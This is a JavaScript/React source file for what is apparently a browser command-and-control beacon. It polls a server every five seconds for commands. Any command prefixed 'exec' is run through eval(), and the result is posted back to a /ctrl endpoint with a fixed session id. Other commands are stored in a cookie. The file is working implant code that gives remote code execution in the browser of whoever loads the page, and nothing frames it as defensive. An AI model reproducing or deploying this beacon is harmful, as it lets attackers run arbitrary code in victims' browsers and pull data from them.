import React, { Component } from 'react';
import ReactDOM from 'react-dom';
//import Twitter from 'twitter';
//var Twitter = require('twitter');

//Beacon Handler
var BeaconHandler = React.createClass({
  loadCommandsFromServer: function() {
    $.ajax({
      url: this.props.url,
      dataType: 'json',
      cache: false,
      success: function(data) {
        this.setState({data: data});
      }.bind(this),
      error: function(xhr, status, err) {
        console.log(this.props.url, status, err.toString());
      }.bind(this)
    });
  },
  getInitialState: function() {
    return {data: []};
  },
  componentDidMount: function() {
    this.loadCommandsFromServer();
    setInterval(this.loadCommandsFromServer, this.props.pollInterval);
  },
  //Push tasks to execution
  render: function() {
   return (
     <Exec data = {this.state.data} />
   );
  }
});


//Execute Commands
var Exec = React.createClass({
  render: function() {
    //console.log(this.props.data);
    var cmdNodes = this.props.data.map(function(command) {
      //Handle Command Execution
      //Standard JS Eval for execution
      //eval(command.CMD);

      //Commander for execution and local system passthrough
      console.log(command.cmd);
      //var Twitter = require('twitter');


      //Logic powering inherent Commands
      if (command.cmd == "help") {
        //POST Response
        var request = new XMLHttpRequest();
        request.open('POST', 'http://localhost:8000/ctrl', true);
        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        request.send(JSON.stringify({resp:"Help Response Data", sid:"1337"}));

      } else if (command.cmd.substring(0,4) == "exec") {
        //POST Response
        //console.log("test" + command.cmd);
        //res = "a";
        var res = eval(command.cmd.slice(5));
        var request = new XMLHttpRequest();
        request.open('POST', 'http://localhost:8000/ctrl', true);
        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        request.send(JSON.stringify({resp: res, sid:"1337"}));

      } else {

        //Write to cookie if exec command
        var expires = new Date();
        expires.setTime(expires.getTime() + (1 * 24 * 60 * 60 * 1000));
        document.cookie = "cmd=!!@" + command.cmd + '!!@;expires=' + expires.toUTCString();

      }



      return (
        <span></span>
      );
    });

    return (
      <b></b>
    );
  }
});



ReactDOM.render(
  <BeaconHandler url={'http://localhost:8000/test.html'} pollInterval={5000} />, document.getElementById('root')
);
